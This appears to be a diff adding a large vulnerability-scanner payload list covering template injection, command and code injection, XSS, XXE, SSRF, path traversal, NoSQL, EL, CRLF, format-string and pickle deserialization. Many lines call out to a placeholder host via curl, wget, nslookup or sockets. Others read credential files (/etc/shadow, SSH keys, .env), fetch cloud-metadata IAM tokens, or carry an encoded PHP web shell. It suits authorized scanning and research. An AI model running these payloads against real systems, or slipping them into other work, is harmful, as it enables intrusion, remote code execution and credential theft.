+{{['5']|map('sleep')}}
+${T(java.lang.Thread).sleep(5000)}
+${"freemarker.template.utility.Execute"?new()("sleep 5")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}
+<% var t=Date.now();while(Date.now()-t<5000){} %>
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('sleep 5');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+##SSTI - OOB##
+{{config.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{lipsum.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{cycler.__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{joiner.__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{request.application.__globals__.__builtins__.__import__('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{self._TemplateReference__context.cycler.__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+${__import__('urllib.request').request.urlopen('http://{domain}/ssti')}
+<%= require('net/http');Net::HTTP.get(URI('http://{domain}/ssti')) %>
+<%= require('open-uri');URI.open('http://{domain}/ssti').read %>
+{{['http://{domain}/ssti']|filter('file_get_contents')}}
+{{['http://{domain}/ssti']|map('file_get_contents')}}
+${T(java.net.URL).new('http://{domain}/ssti').openStream()}
+${"java.net.URL"?new("http://{domain}/ssti").openStream()}
+<#assign url="java.net.URL"?new("http://{domain}/ssti")>${url.openStream()}
+<% require('http').get('http://{domain}/ssti',function(r){}); %>
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('http').get('http://{domain}/ssti');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+##Tornado (Python) - Error##
+{{invalid.__class__}}
+{{[].__class__.__bases__[99]}}
+##Tornado (Python) - Timing##
+{%import time%}{{time.sleep(5)}}
+##Tornado (Python) - OOB##
+{%import urllib.request%}{{urllib.request.urlopen('http://{domain}/tornado')}}
+{%import urllib.request%}{{urllib.request.urlopen('http://{domain}/tornado').read()}}
+##Nunjucks (Node) - Timing##
+{{range(99999999)|join}}
+##Pug (Node) - Math##
+=7*191
+#{7*191}
+##Pug (Node) - Error##
+=undefined.property.deep
+##Mustache (Logic-less) - Error##
+{{#invalid}}{{/invalid}}
+{{> invalid_partial}}
+##Smarty (PHP) - Math##
+{7*191}
+{math equation="7*191"}
+{math equation="7 * 191"}
+##Smarty (PHP) - Error##
+{invalid_function()}
+##Smarty (PHP) - Timing##
+{php}sleep(5);{/php}
+##Smarty (PHP) - OOB##
+{fetch file="http://{domain}/smarty"}
+{fetch file="http://{domain}/smarty" assign="x"}
+##Blade (PHP/Laravel) - Math##
+{!!7*191!!}
+##Blade (PHP/Laravel) - Error##
+{{$undefined->method()}}
+##Blade (PHP/Laravel) - Timing##
+@php sleep(5); @endphp
+##Blade (PHP/Laravel) - OOB##
+@php file_get_contents('http://{domain}/blade') @endphp
+@php fopen('http://{domain}/blade','r') @endphp
+##ERB (Ruby) - Error##
+<%=invalid%>
+<%=raise 'ssti_error'%>
+##ERB (Ruby) - Timing##
+<%=sleep(5)%>
+<%=sleep 5%>
+##ERB (Ruby) - OOB##
+<%=require 'net/http';Net::HTTP.get(URI('http://{domain}/erb'))%>
+<%=require 'open-uri';URI.open('http://{domain}/erb').read%>
+##Slim (Ruby) - Math##
+= 7 * 191
+##Slim (Ruby) - Error##
+=invalid_var
+=raise 'ssti_error'
+##Slim (Ruby) - Timing##
+=sleep(5)
+##Slim (Ruby) - OOB##
+=require 'net/http';Net::HTTP.get(URI('http://{domain}/slim'))
+##Haml (Ruby) - OOB##
+=require 'net/http';Net::HTTP.get(URI('http://{domain}/haml'))
+##Liquid (Ruby/Shopify) - Error##
+{{invalid | no_such_filter}}
+##Thymeleaf (Java) - Math##
+[[${7*191}]]
+[[${T(java.lang.Math).abs(-1337)}]]
+*{7*191}
+##Thymeleaf (Java) - Error##
+[[${T(invalid).method()}]]
+[[${T(java.lang.Runtime).exec('invalid')}]]
+##Thymeleaf (Java) - Timing##
+[[${T(java.lang.Thread).sleep(5000)}]]
+##Thymeleaf (Java) - OOB##
+[[${T(java.net.URL).new('http://{domain}/thymeleaf').openStream()}]]
+[[${new java.util.Scanner(T(java.net.URL).new('http://{domain}/thymeleaf').openStream()).next()}]]
+##Pebble (Java) - Math##
+{{"".class.forName("java.lang.Math").getMethod("abs",long.class).invoke(null,-1337)}}
+##Pebble (Java) - Timing##
+{{"".getClass().forName("java.lang.Thread").getMethod("sleep",long.class).invoke(null,5000)}}
+##Pebble (Java) - OOB##
+{{"".getClass().forName("java.net.URL").getConstructor("".getClass()).newInstance("http://{domain}/pebble").openStream()}}
+##Razor (C#/.NET) - Math##
+@(7*191)
+@(System.Math.Abs(-1337))
+##Razor (C#/.NET) - Error##
+@(invalid)
+@(throw new System.Exception("ssti_error"))
+##Razor (C#/.NET) - Timing##
+@{System.Threading.Thread.Sleep(5000);}
+##Razor (C#/.NET) - OOB##
+@{new System.Net.WebClient().DownloadString("http://{domain}/razor");}
+@{new System.Net.Http.HttpClient().GetStringAsync("http://{domain}/razor").Result;}
+##Go text/template - Math##
+{{printf "%d" 1337}}
+{{html 1337}}
+##Go text/template - Error##
+{{.Invalid}}
+{{template "nonexistent"}}
+
+##OS Cmd Injection - Error-Based##
+;invalidcmd
+|invalidcmd
+||invalidcmd
+&&invalidcmd
+;invalidcmd #
+|invalidcmd #
+& invalidcmd
+&& invalidcmd
+;invalidcmd;
+|invalidcmd|
+;invalidcmd#'|invalidcmd|"`invalidcmd`
+;invalidcmd${IFS}arg
+;/usr/bin/invalidcmd
+& invalidcmd.exe
+;invalidcmd 2>&1
+##OS Cmd Injection - Math-Based (Canary: 1337)##
+;expr 7 \* 191
+;echo $((7*191))
+|expr 7 \* 191
+|echo $((7*191))
+||echo $((7*191))
+&&echo $((7*191))
+$(echo $((7*191)))
+`expr 7 \* 191`
+`echo $((7*191))`
+;echo $((7*191))#'`echo $((7*191))`"
+;python3 -c "print(7*191)"
+;python -c "print(7*191)"
+;perl -e "print 7*191"
+;ruby -e "puts 7*191"
+;node -e "console.log(7*191)"
+& set /a 7*191
+& powershell -c "7*191"
+;echo $((7331/1*1))
+|echo $((7331-0))
+;printf '%d' $((7*191))
+;awk 'BEGIN{print 7*191}'
+;bc <<< "7*191"
+${IFS};echo${IFS}$((7*191))
+##OS Cmd Injection - Timing-Based##
+;sleep 5
+|sleep 5
+||sleep 5
+&&sleep 5
+$(sleep 5)
+`sleep 5`
+;sleep 5 #
+|sleep 5 #
+;sleep${IFS}5
+${IFS}sleep${IFS}5
+;sleep 5;
+|sleep 5|
+||sleep 5||
+&&sleep 5&&
+;sleep 5#'|sleep 5|"`sleep 5`
+;/bin/sleep 5
+;/usr/bin/sleep 5
+;$(sleep 5)
+;`sleep 5`
+& timeout 5
+| timeout 5
+|| timeout 5
+&& timeout 5
+& timeout /t 5 /nobreak
+| timeout /t 5 /nobreak
+& ping -n 6 127.0.0.1
+| ping -n 6 127.0.0.1
+& ping -n 6 127.0.0.1 >nul
+& powershell Start-Sleep -s 5
+| powershell Start-Sleep -s 5
+& powershell -c "Start-Sleep 5"
+;sleep 5 #'& timeout 5 &"`sleep 5`
+;python3 -c "__import__('time').sleep(5)"
+;python -c "import time;time.sleep(5)"
+;perl -e "sleep(5)"
+;ruby -e "sleep(5)"
+;node -e "require('child_process').execSync('sleep 5')"
+;sleep$IFS'5'
+;sl\eep 5
+;s'l'e'e'p 5
+;s"l"e"e"p 5
+;$'\x73\x6c\x65\x65\x70' 5
+;/???/s?e?p 5
+##OS Cmd Injection - OOB##
+;curl http://{domain}
+|curl http://{domain}
+||curl http://{domain}
+&&curl http://{domain}
+;curl${IFS}http://{domain}
+;wget http://{domain}
+|wget http://{domain}
+;nslookup {domain}
+|nslookup {domain}
+||nslookup {domain}
+&&nslookup {domain}
+;ping -c 1 {domain}
+|ping -c 1 {domain}
+;dig {domain}
+;host {domain}
+;/bin/bash -c "true > /dev/tcp/{domain}/9999"
+;python3 -c "__import__('urllib.request').request.urlopen('http://{domain}')"
+;python -c "import urllib2;urllib2.urlopen('http://{domain}')"
+;curl http://{domain}#'|curl http://{domain}|"`curl http://{domain}`
+& nslookup {domain}
+| nslookup {domain}
+|| nslookup {domain}
+&& nslookup {domain}
+& certutil -urlcache -f http://{domain} out.tmp
+& powershell Invoke-WebRequest http://{domain}
+& powershell -c "iwr http://{domain}"
+| powershell -c "(New-Object Net.WebClient).DownloadString('http://{domain}')"
+& ping -n 1 {domain}
+| ping -n 1 {domain}
+;curl${IFS}http://{domain}#'&${IFS}nslookup${IFS}{domain}&"`curl${IFS}http://{domain}`
+;perl -e "use IO::Socket::INET;IO::Socket::INET->new(PeerAddr=>'{domain}',PeerPort=>9999)"
+;ruby -e "require 'net/http';Net::HTTP.get(URI('http://{domain}'))"
+;node -e "require('http').get('http://{domain}')"
+;python3 -c "__import__('socket').create_connection(('{domain}',9999))"
+;php -r "fsockopen('{domain}',9999);"
+
+##Code Injection - Error-Based##
+__import__("invalid")
+require('invalid')
+invalid_function()
+invalid_method
+use invalid;
+System.exit(-1)
+eval("invalid syntax here %%%")
+exec("raise Exception('probe')")
+$nonexistent->method()
+Kernel.exit(1)
+os.execute("invalidcmd")
+throw new Error("probe")
+die("probe")
+raise "probe"
+Import-Module InvalidModule
+java.lang.Runtime.getRuntime().exec("invalidcmd")
+${T(java.lang.Runtime).getRuntime().exec("invalidcmd")}
+##Code Injection - Math-Based (Canary: 1337)##
+eval("7*191")
+7*191;
+console.log(7*191)
+echo 7*191;
+puts 7*191
+Math.abs(-1337)
+-1337.abs
+__import__("math").factorial(0)+1336
+parseInt("1337")
+intval("1337")
+Integer("1337")
+(1337).to_s.to_i
+7331-5994
+(function(){return 7*191})()
+##Code Injection - Timing-Based##
+__import__("time").sleep(5)
+exec("import time;time.sleep(5)")
+sum(range(500000000))
+(function(){var t=Date.now();while(Date.now()-t<5000){}}())
+for(var i=0;i<5e9;i++){}
+Atomics.wait(new Int32Array(new SharedArrayBuffer(4)),0,0,5000)
+usleep(5000000)
+time_nanosleep(5,0)
+array_map(function($x){return $x*$x;},range(1,99999999))
+sleep(5);
+sleep 5
+Kernel.sleep(5)
+99999999.times{1+1}
+Start-Sleep -Seconds 5
+[System.Threading.Thread]::Sleep(5000)
+##Code Injection - OOB (Built-in HTTP/stdlib)##
+__import__('socket').create_connection(('{domain}',9999))
+__import__('http.client').client.HTTPConnection('{domain}',9999).request('GET','/')
+require('net').connect(9999,'{domain}')
+fetch('http://{domain}/nodeeval')
+file_get_contents("http://{domain}/phpeval")
+fsockopen("{domain}",9999)
+fopen("http://{domain}/phpeval","r")
+stream_socket_client("tcp://{domain}:9999")
+require 'net/http'; Net::HTTP.get(URI('http://{domain}/rbeval'))
+TCPSocket.new('{domain}',9999)
+require('open-uri');URI.open('http://{domain}/rbeval')
+use IO::Socket::INET; IO::Socket::INET->new(PeerAddr=>'{domain}',PeerPort=>9999)
+use LWP::Simple; get("http://{domain}/pleval")
+new java.net.URL("http://{domain}/javaeval").openStream()
+new java.net.Socket("{domain}",9999)
+Invoke-WebRequest http://{domain}/pseval
+(New-Object Net.WebClient).DownloadString("http://{domain}/pseval")
+[System.Net.Sockets.TcpClient]::new('{domain}',9999)
+##Lua Code Injection##
+loadstring("return 7*191")()
+assert(loadstring('return 7*191'))()
+loadstring("error('1337')")()
+error('1337')
+local s=os.clock();while os.clock()-s<5 do end
+require('socket').sleep(5)
+require("socket").connect("{domain}", 80)
+require("socket.http").request("http://{domain}/lua")
+##PHP Code Injection##
+assert(system('echo 1337'))
+preg_replace('/.*/e','system("echo 1337")','')
+create_function('','return 7*191;')()
+assert(sleep(5)||1)
+assert(file_get_contents('http://{domain}/php'))
+##Perl Code Injection##
+eval('select(undef,undef,undef,5)')
+##Java ScriptEngine Injection##
+var x=7*191
+java.lang.Runtime.getRuntime().exec('sleep 5')
+new java.net.URL("http://{domain}/nashorn").openStream()
+var u=new java.net.URL("http://{domain}/graaljs");var c=u.openConnection();c.getInputStream()
+
+##XSS - Math (1337 reflected via context breakers)##
+"'`><script>alert(1337)</script>
+"'`><img src=x onerror=alert(1337)>
+"'`><svg/onload=alert(1337)>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert(1337)//>
+-->'"/></sCript><deTailS open x=">" ontoggle=(alert)(1337)>
+"><img src=x onerror=alert(1337)>
+'><img src=x onerror=alert(1337)>
+"><svg onload=alert(1337)>
+'><svg onload=alert(1337)>
+`><svg onload=alert(1337)>
+</script><svg onload=alert(1337)>
+</title><svg onload=alert(1337)>
+</textarea><svg onload=alert(1337)>
+</style><svg onload=alert(1337)>
+" autofocus onfocus=alert(1337) x="
+' autofocus onfocus=alert(1337) x='
+" onclick=alert(1337) "
+' onclick=alert(1337) '
+javascript:alert(1337)
+javascript:alert(1337)//
+##XSS - Error (event handlers)##
+<body onload=alert(1337)>
+<input onfocus=alert(1337) autofocus>
+<marquee onstart=alert(1337)>
+<video src=x onerror=alert(1337)>
+<audio src=x onerror=alert(1337)>
+<details open ontoggle=alert(1337)>
+<object data="javascript:alert(1337)">
+<embed src="javascript:alert(1337)">
+<iframe src="javascript:alert(1337)">
+<math><maction actiontype="statusline#" xlink:href="javascript:alert(1337)">1337</maction></math>
+##XSS - Error (filter evasion)##
+<ScRiPt>alert(1337)</ScRiPt>
+<scr<script>ipt>alert(1337)</scr</script>ipt>
+<svg/onload=alert(1337)>
+<svg onload=alert&#40;1337&#41;>
+<svg onload=alert&#x28;1337&#x29;>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;1337&#41;">
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1337)>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1337)">click</a>
+<img src=x onerror=alert(1337)//
+##XSS - Math (template literal / backtick)##
+${alert(1337)}
+`${alert(1337)}`
+##XSS - Error (DOM clobbering)##
+<form id="x"><input name="action" value="javascript:alert(1337)"></form>
+##XSS - Error (mutation XSS)##
+<noscript><p title="</noscript><img src=x onerror=alert(1337)>">
+##XSS - Error (data URI)##
+<a href="data:text/html,<script>alert(1337)</script>">click</a>
+##XSS - Math (SVG)##
+<svg><script>alert(1337)</script></svg>
+
+##XXE - Error-Based##
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "1337">]><root>&xxe;</root>
+<foo>1337</foo>
+<![CDATA[1337]]>
+##XXE - File Read##
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
+##XXE - OOB##
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{domain}/xxe.dtd">%xxe;]><root>1337</root>
+<hjk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{domain}/xxe" parse="text"/></hjk>
+##XXE - Billion Laughs (Timing/DoS)##
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "1337"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>
+##XXE - Error (recursive entity)##
+<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "1337">]><foo>&a;</foo>
+##SSRF - Error-Based##
+http://[invalid
+http://
+http:///
+file://
+gopher://
+http://127.0.0.1:1
+http://127.0.0.1:0
+http://localhost:99999
+http://[::]:1
+ftp://127.0.0.1:1
+http://127.0.0.1:22
+http://0.0.0.0:1
+dict://127.0.0.1:11211/INFO
+ldap://127.0.0.1:389
+##SSRF - Math-Based##
+http://127.0.0.1:1337
+http://localhost:1337
+http://127.0.0.1:7331
+http://0.0.0.0:1337
+http://[::1]:1337
+http://2130706433:1337
+http://0x7f000001:1337
+##SSRF - Timing-Based##
+http://10.255.255.1/
+http://192.0.2.1/
+http://198.51.100.1/
+http://203.0.113.1/
+https://10.255.255.1/
+http://10.255.255.1:8080/
+http://10.255.255.1:443/
+http://192.0.2.1:8443/
+http://[fd00::1]/
+http://192.168.255.255/
+http://172.31.255.255/
+ftp://10.255.255.1/
+gopher://192.0.2.1:70/
+http://10.255.255.1:9999/timeout
+##SSRF - OOB##
+https://{domain}/ssrf
+http://{domain}:8080/ssrf
+http://{domain}:443/ssrf
+//{domain}/ssrf
+\\{domain}\ssrf
+http://{domain}%23@127.0.0.1
+http://foo.{domain}/ssrf
+gopher://{domain}:70/_test
+ftp://{domain}/ssrf
+dict://{domain}:11211/INFO
+ldap://{domain}:389/
+##SSRF - Cloud Metadata##
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/api/token
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/opc/v2/instance/
+http://169.254.169.254/opc/v2/instance/metadata/
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+http://169.254.169.254/v1/
+http://169.254.169.254/v1/metadata
+##SSRF - IP Bypass##
+http://2130706433/
+http://0x7f.0x0.0x0.0x1/
+http://017700000001/
+http://0177.0000.0000.0001/
+http://127.0.1/
+http://0/
+http://0.0.0.0/
+http://[::1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[::1]:80/
+http://[::ffff:7f00:1]/
+http://127.0.0.1.nip.io/
+http://spoofed.burpcollaborator.net/
+http://localtest.me/
+http://127.127.127.127/
+http://0x7f000001.nip.io/
+##SSRF - Protocol Schemes##
+file:///etc/hosts
+file:///c:/windows/win.ini
+file:///c:/boot.ini
+file:///proc/self/environ
+file:///proc/self/cmdline
+gopher://127.0.0.1:25/_HELO%20localhost
+gopher://127.0.0.1:6379/_INFO%0d%0a
+gopher://127.0.0.1:11211/_stats%0d%0a
+dict://127.0.0.1:11211/stats
+ftp://127.0.0.1/
+jar:http://127.0.0.1/!/
+netdoc:///etc/passwd
+ldap://127.0.0.1:389/%0astats%0aquit
+##SSRF - URL Tricks##
+http://evil@127.0.0.1/
+http://127.0.0.1#@evil.com
+http://evil.com@127.0.0.1/
+http://127.0.0.1?@evil.com/
+http://evil.com%0d%0a%0d%0aGET%20/internal
+http://127.0.0.1/..;/..;/admin
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.0.0.1\t@evil.com/
+##SSRF - DNS Rebinding##
+http://1337.oob.{domain}/
+##SSRF - Open Redirect Chain##
+http://localhost/redirect?url=http://{domain}/ssrf
+##SSRF - Internal Service Probe (Elasticsearch)##
+http://127.0.0.1:9200/_cluster/health
+##SSRF - IPv6 Zone ID Bypass##
+http://[::1%25eth0]/
+##Path Traversal - Error-Based##
+../../../../../../../root/.ssh/id_rsa
+..\..\..\..\..\..\windows\system32\config\SAM
+/proc/self/mem
+/dev/zero
+/nonexistent/path/file.txt
+C:\nonexistent\path\file.txt
+....//....//....//....//etc/shadow
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow
+##Path Traversal - Math-Based##
+../../../../../../../tmp/1337
+....//....//....//tmp/1337
+%2e%2e%2ftmp%2f1337
+..%2ftmp%2f1337
+##Path Traversal - Timing-Based##
+/dev/urandom
+/proc/self/fd/0
+../../../../../../../dev/random
+/proc/self/exe
+../../../../../../../proc/kmsg
+/dev/stdin
+../../../../../../../proc/self/mem
+##Path Traversal - OOB##
+....//....//....//....//proc/self/environ
+/proc/self/net/arp
+##Path Traversal - Traversal Sequences Linux##
+../etc/passwd
+../../etc/passwd
+../../../../../../../proc/self/cwd
+##Path Traversal - Traversal Sequences Windows##
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
+##Path Traversal - Encoding Bypass##
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini
+..%252f..%252f..%252f..%252fetc%252fpasswd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
+..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+##Path Traversal - Null Byte and Normalization##
+../../../../../../../etc/passwd%00
+../../../../../../../etc/passwd%00.jpg
+../../../../../../../etc/passwd%00.png
+../../../../../../../etc/passwd%00.html
+..%00/..%00/..%00/etc/passwd
+..%0d/..%0d/..%0d/etc/passwd
+/;/../../../etc/passwd
+/.;/../../../etc/passwd
+/.%00/../../../etc/passwd
+....//....//....//....//etc/passwd
+....\/....\/....\/....\/etc/passwd
+..../\..../\..../\etc/passwd
+....//....//....//....//windows/win.ini
+##Path Traversal - Target Files##
+.env
+../.env
+../../.env
+../../../.env
+.git/config
+../.git/config
+../../.git/config
+web.config
+../web.config
+../../web.config
+WEB-INF/web.xml
+../WEB-INF/web.xml
+../../WEB-INF/web.xml
+application.properties
+../application.properties
+../../application.properties
+config/database.yml
+../config/database.yml
+../../config/database.yml
+##Path Traversal - PHP Wrappers##
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=../../wp-config.php
+php://filter/read=string.rot13/resource=index.php
+php://filter/read=convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=index.php
+php://input
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
+expect://id
+expect://whoami
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=php://input
+##Path Traversal - Windows UNC##
+\\{domain}\share\test
+##Path Traversal - NTFS Alternate Data Stream##
+....//....//etc/passwd::$DATA
+##Path Traversal - Windows 8.3 Short Name##
+..\..\WINDOW~1\system32\config\SAM
+##Path Traversal - Backup Files##
+.env.bak
+config.php.bak
+web.config.old
+.git/HEAD
+.svn/entries
+##Path Traversal - API Context##
+/api/v1/../../etc/passwd
+/static/../../etc/passwd
+
+##NoSQL - Error-Based##
+{$gt:""}
+'"\/$[].>
+##NoSQL - Math-Based (Canary: 1337)##
+{"$expr":{"$literal":1337}}
+[$where]=return 7*191
+true, $where: 'return 7*191'
+##NoSQL - Operator Injection##
+{"$ne":null}
+{"$exists":true}
+{"$and":[{"$ne":null}]}
+[$ne]=1
+[$gt]=
+[$regex]=.*
+[$exists]=true
+[$in][]=admin
+$ne[]=1
+$gt=
+$regex=.*
+##NoSQL - Timing-Based##
+[$where]=sleep(5000)
+##NoSQL - OOB##
+{"$where":"this.a==1||new Function('return fetch(\"http://{domain}/nosql\")')()"}
+[$where]=fetch('http://{domain}/nosql')
+##NoSQL - Redis##
+EVAL "return 7*191" 0
+EVAL "redis.call('SET','test','1337')" 0
+DEBUG SLEEP 5
+SET test 1337
+CONFIG GET *
+INFO
+KEYS *
+
+##EL Injection - Error-Based##
+%{invalid}
+${T(invalid.Class)}
+${1/0}
+##EL Injection - Math-Based (Canary: 1337)##
+%{7*191}
+${T(java.lang.Math).abs(-1337)}
+#{T(java.lang.Math).abs(-1337)}
+${7*191}${7*191}
+##EL Injection - Timing-Based##
+#{T(java.lang.Thread).sleep(5000)}
+%{@java.lang.Thread@sleep(5000)}
+##EL Injection - OOB##
+${T(java.net.URL).new('http://{domain}/eleval').openStream()}
+#{T(java.net.URL).new('http://{domain}/eleval').openStream()}
+${new java.net.URL("http://{domain}/eleval").openStream()}
+${new java.net.Socket("{domain}",9999)}
+%{(#url=new java.net.URL('http://{domain}/eleval')).(#url.openStream())}
+
+##Prototype Pollution - Math (Canary: 1337)##
+{"__proto__":{"polluted":"1337"}}
+{"constructor":{"prototype":{"polluted":"1337"}}}
+{"__proto__":{"toString":"1337"}}
+{"__proto__":{"valueOf":"1337"}}
+{"__proto__":{"1337":"polluted"}}
+##Prototype Pollution - Error##
+{"__proto__":{"polluted":"1337"},"test":null,"error":"probe"}
+constructor.prototype.polluted=1337&__proto__[test]=undefined
+__proto__[toString]=invalid&constructor[prototype][valueOf]=NaN
+
+##CRLF - Math (1337 in injected header)##
+%0d%0aInjected-Header:1337
+%0d%0aX-Injected:1337
+\r\nInjected:1337
+%E5%98%8A%E5%98%8DInjected:1337
+%0aInjected:1337
+%0dInjected:1337
+1337%0d%0aInjected:true
+1337%00%0d%0aInjected:true
+##CRLF - Error (response splitting)##
+%0d%0a%0d%0a<script>alert(1337)</script>
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1337)</script>
+%0d%0aSet-Cookie:injected=1337
+%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1337)</script>
+%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:25%0d%0a%0d%0a<script>alert(1337)</script>
+##CRLF - OOB##
+%0d%0aHost:1337.{domain}
+
+##Format String - Error (C/C++ crash/leak)##
+%s%s%s%s%s
+%x%x%x%x%x
+%p%p%p%p%p
+%n%n%n%n
+%d%d%d%d%d
+AAAA%08x.%08x.%08x.%08x
+%@
+%%n%%n%%n%%n
+##Format String - Error (.NET)##
+{0}{1}{2}{3}{4}
+{0:D20}
+##Format String - Math (.NET)##
+String.Format("{0}",1337)
+##Format String - Error (Python info leak)##
+{0.__class__.__mro__}
+%(test)s
+{.__class__.__init__.__globals__}
+##Format String - Error (Overflow/Boundary)##
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+##Python Pickle P0 - Math (eval 7*191)##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
+##Python Pickle P0 - Timing (sleep 5)##
+Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
+##Python Pickle P0 - OOB urllib##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUiKScKdFIu
+##Python Pickle P0 - OOB DNS##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygic29ja2V0IikuZ2V0YWRkcmluZm8oIntkb21haW59Iiw4MCknCnRSLg==
+##Python Pickle P0 - Error (1/0)##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnMS8wJwp0Ui4=
+##Python Pickle P0 - Error (bad import)##
+Y19fYnVpbHRpbl9fCl9faW1wb3J0X18KKFMnaW52YWxpZF9tb2R1bGVfMTMzNycKdFIu
+##Python Pickle P0 - Math (subprocess echo 1337)##
+Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CihTJ2VjaG8gMTMzNycKSTAxCnRSLg==
